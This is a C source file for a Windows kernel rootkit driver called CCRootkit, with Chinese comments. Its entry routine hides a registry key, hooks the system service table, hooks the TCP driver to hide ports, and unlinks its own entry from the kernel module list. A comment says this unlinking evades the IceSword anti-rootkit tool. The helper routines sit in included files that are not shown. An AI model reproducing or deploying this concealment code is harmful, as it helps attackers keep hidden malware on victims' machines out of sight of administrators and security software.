#include "ntddk.h"
#include "HideRegKey.h"
#include "HookSysCall.h"
#include "CCRootkit.h"
#include "HookSSDT.c"
#include "hideport.c"

#define dbg(_X_) KdPrint((_X_))
#define Dbg(_X_) KdPrint((_X_))

typedef struct _MODULE_ENTRY {
   LIST_ENTRY ModuleListEntry;
   DWORD unknown1[4];
   DWORD base;
   DWORD DriverStart;
   DWORD unknown2;
   UNICODE_STRING DriverPath;
   UNICODE_STRING DriverName;
   //...
} MODULE_ENTRY, *PMODULE_ENTRY;

NTSTATUS DKOMHideCurrentDriver(IN PDRIVER_OBJECT pDriverObject)
{
	 PMODULE_ENTRY pModuleEntry;
	 
   if (pDriverObject == NULL)
     return STATUS_UNSUCCESSFUL;
     
   //Dereference offset 0x14 within the driver object.
   //Now you should have the address of a module entry.
   pModuleEntry = *((PMODULE_ENTRY *)((DWORD)pDriverObject + 0x14));
   if(pModuleEntry != NULL)
   {
   	 KdPrint(("Hide Driver Name:%ws\n",  pModuleEntry->DriverName.Buffer));
     //将本驱动程序的相应目录项从项驱动程序目录中拆下来
     *((PDWORD)pModuleEntry->ModuleListEntry.Blink) = 
                 (DWORD)pModuleEntry->ModuleListEntry.Flink;
                 
      pModuleEntry->ModuleListEntry.Flink->Blink = 
                  pModuleEntry->ModuleListEntry.Blink;
      return STATUS_SUCCESS;
   }
   return STATUS_UNSUCCESSFUL;
}

NTSTATUS DriverEntry(
	 IN PDRIVER_OBJECT  pDriverObject,
	 IN PUNICODE_STRING regPath)
{
	NTSTATUS ntStatus;
	UNICODE_STRING  DeviceNameUnicodeString;
	UNICODE_STRING  DeviceLinkUnicodeString;
	PDEVICE_EXTENSION pDevExt;
	PDEVICE_OBJECT pDeviceObject = NULL;
	int i;

	KdPrint(("Driver is loaded!\n"));
   
	RtlInitUnicodeString( &DeviceNameUnicodeString, 
	                       deviceNameBuffer );
	RtlInitUnicodeString( &DeviceLinkUnicodeString, 
	                       deviceLinkBuffer );
	 
   // 创建命名的设备对象
	 ntStatus = IoCreateDevice (
	      pDriverObject,
        sizeof(DEVICE_EXTENSION),	//DeviceExtensionSize
        &DeviceNameUnicodeString,
        FILE_DEVICE_UNKNOWN,		// 
        0,							  //No standard device characteristics
        FALSE,						//not exclusive device
        &pDeviceObject );
        
	 if( !NT_SUCCESS(ntStatus) ) 
	 {
	 	  KdPrint(("IoCreateDevice Fail!"));
		  return ntStatus;
	 }
	 
   //生成Win32子系统下的用户程序可识别的设备名
	 ntStatus = IoCreateSymbolicLink( &DeviceLinkUnicodeString,&DeviceNameUnicodeString );
	 if (!NT_SUCCESS(ntStatus))
	 {
		  dbg("IoCreateSymbolicLink fail!");
		  //Delete device object if not successful
		  IoDeleteDevice( pDriverObject->DeviceObject );
		  return ntStatus;
	 }
	 
	 pDriverObject->DriverUnload = DriverOnUnload;
	 for(i=0; i<IRP_MJ_MAXIMUM_FUNCTION+1; i++)
	 {
	    pDriverObject->MajorFunction[i] = OnStubDispatch;	
	 }
	 pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RootkitIoctl;
	 

	ntStatus = HideRegKey(HideKeyName);
	 
	if ( NT_SUCCESS(ntStatus) )
	{
		KdPrint(("HideRegKey Success!\n"));
	}
	
	//pre hide process
	//GetProcessNameOffset();
	
	if( NT_SUCCESS(ntStatus) )
	{
		ntStatus = HookSystemServiceCall();
		if( NT_SUCCESS(ntStatus) )
		{
			KdPrint(("HookSSDT Ok!"));
		}
	}

	//hide port
	InstallTCPDriverHook();
	
	//DKOM隐藏驱动:过最新IceSword V1.2.2
	ntStatus = DKOMHideCurrentDriver(pDriverObject);
	if ( NT_SUCCESS(ntStatus) )
	{
	    KdPrint(("DKOMHideCurrentDriver OK.\n"));
	}
   
	 return STATUS_SUCCESS;
}

void DriverOnUnload(	IN PDRIVER_OBJECT pDriverObject	)
{
	UNICODE_STRING  DeviceLinkUnicodeString;
	PDEVICE_EXTENSION pDevExt;
	PDEVICE_OBJECT pDeviceObject;
	NTSTATUS ntStatus;
   
	Dbg("Driver in Unload!\n");

	RtlInitUnicodeString( &DeviceLinkUnicodeString, deviceLinkBuffer );
	IoDeleteSymbolicLink( &DeviceLinkUnicodeString );
	//删除分配的设备名及设备
	IoDeleteDevice( pDriverObject->DeviceObject );
	 
	UnHideRegKey();              //取消隐藏注册表键
	UnhookSystemServiceCall();   //取消挂钩SSDT
	PortUnload();
}

NTSTATUS OnStubDispatch( IN PDEVICE_OBJECT pDeviceObject,
	                       IN PIRP pIrp	)
{
	 dbg(" OnStubDispatch() was Called.... \n");
	 pIrp->IoStatus.Status = STATUS_SUCCESS;
	 pIrp->IoStatus.Information = 0;
	 IoCompleteRequest( pIrp, IO_NO_INCREMENT );
	 return STATUS_SUCCESS;
}


NTSTATUS RootkitIoctl(
   IN PDEVICE_OBJECT pDeviceObject, 
   IN PIRP Irp)
{
   NTSTATUS  ntStatus = STATUS_UNSUCCESSFUL;
   PIO_STACK_LOCATION  irpStack = IoGetCurrentIrpStackLocation(Irp);
   PDEVICE_EXTENSION  extension = pDeviceObject->DeviceExtension;

   switch(irpStack->Parameters.DeviceIoControl.IoControlCode)
   {
      default:
        break;
   }

   Irp->IoStatus.Status = ntStatus;

   // 设置返回给用户层程序的数据的字节数
   if(ntStatus == STATUS_SUCCESS)
      Irp->IoStatus.Information = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
   else
      Irp->IoStatus.Information = 0;

   IoCompleteRequest(Irp, IO_NO_INCREMENT);
   return ntStatus;
}